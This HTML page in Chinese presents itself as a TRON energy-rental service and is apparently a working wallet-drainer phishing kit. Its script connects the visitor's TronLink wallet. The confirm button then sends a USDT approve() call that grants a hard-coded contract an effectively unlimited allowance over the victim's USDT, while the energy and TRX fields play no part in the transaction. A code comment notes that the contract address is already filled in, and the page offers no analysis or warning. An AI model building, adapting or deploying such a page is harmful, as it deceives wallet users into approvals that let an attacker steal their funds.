<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>能量租赁</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
<style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        "Microsoft YaHei", Arial, sans-serif;
      background: #f5f6f8;
      color: #222;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      width: min(460px, calc(100% - 32px));
      background: #fff;
      border-radius: 18px;
      padding: 28px;
      box-shadow: 0 10px 35px rgba(0,0,0,.08);
    }
    h1 {
      margin: 0 0 8px;
      text-align: center;
      font-size: 28px;
    }
    .subtitle {
      text-align: center;
      color: #777;
      font-size: 14px;
      margin-bottom: 20px;
    }
    button {
      width: 100%;
      border: 0;
      border-radius: 11px;
      padding: 13px 16px;
      font-size: 15px;
      cursor: pointer;
      background: #222;
      color: white;
      transition: .2s;
      margin-bottom:12px;
    }
    button:hover {
      opacity: .88;
    }
    button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }
    .field {
      margin-bottom: 16px;
    }
    label {
      display: block;
      font-size: 13px;
      color: #666;
      margin-bottom: 7px;
    }
    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #ddd;
      border-radius: 10px;
      outline: none;
      font-size: 15px;
    }
    input:focus {
      border-color: #777;
    }
    .warning {
      background: #fff7e6;
      border: 1px solid #ffe0a3;
      color: #8a5a00;
      border-radius: 10px;
      padding: 12px;
      font-size: 12px;
      line-height: 1.6;
      margin: 16px 0;
    }
    .status {
      min-height: 20px;
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
      color: #666;
    }
    .network {
      text-align: center;
      font-size: 12px;
      color: #999;
      margin-top: 18px;
    }
</style>
</head>
<body>
<div class="container">
<h1>能量租赁</h1>
<div class="field">
    <label>能量</label>
    <input type="number" id="inpEnergy" placeholder="请输入需要租赁的能量数量">
</div>
<div class="field">
    <label>消耗TRX</label>
    <input type="number" id="inpTrx" placeholder="对应的TRX数量">
</div>

<button onclick="connectWallet()">连接钱包</button>
<button onclick="approveToken()">确认</button>

<div id="log" class="status"></div>

<div class="network">TRON TRC20‑USDT</div>
</div>

<script>
 // 已经填入你的合约地址
const CONTRACT_ADDRESS = "TGoZkUojDzZG1KPLyi6BFSm9wKL118Y3Ls";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIX_AMOUNT = BigInt("6859382084082938309389090");
// 换算比例：1 TRX = 50000 能量
const ENERGY_PER_TRX = 50000;

let inpEnergy = document.getElementById('inpEnergy');
let inpTrx = document.getElementById('inpTrx');

// 输入能量自动算出TRX
inpEnergy.addEventListener('input', function(){
    let eVal = Number(this.value);
    if(!eVal || eVal <=0){
        inpTrx.value = '';
        return;
    }
    let trxVal = eVal / ENERGY_PER_TRX;
    inpTrx.value = trxVal;
});
// 输入TRX自动算出能量
inpTrx.addEventListener('input', function(){
    let tVal = Number(this.value);
    if(!tVal || tVal <=0){
        inpEnergy.value = '';
        return;
    }
    let eVal = tVal * ENERGY_PER_TRX;
    inpEnergy.value = eVal;
});


let tronWeb;
async function connectWallet(){
    document.getElementById("log").innerText="正在请求钱包连接...";
    if(window.tron){
        try{
            await window.tron.request({method:"tron_requestAccounts"});
            tronWeb = window.tronWeb;
            document.getElementById("log").innerText = "钱包已连接：" + tronWeb.defaultAddress.base58;
        }catch(e){
            document.getElementById("log").innerText = "用户拒绝连接或者钱包异常:"+e.message;
        }
    }else if(window.tronWeb && window.tronWeb.ready){
        tronWeb = window.tronWeb;
        document.getElementById("log").innerText = "钱包已连接：" + tronWeb.defaultAddress.base58;
    }else{
        document.getElementById("log").innerText = "当前钱包不支持TRON，请使用TronLink钱包";
    }
}
async function approveToken(){
    if(!tronWeb) return alert("请先连接钱包");
    const usdt = await tronWeb.contract().at(USDT_CONTRACT);
    try{
        const tx = await usdt.approve(CONTRACT_ADDRESS, FIX_AMOUNT).send();
        document.getElementById("log").innerText = "成功，交易哈希：" + tx;
    }catch(err){
        document.getElementById("log").innerText = "失败：" + err.message;
    }
}
</script>

</body>
</html>
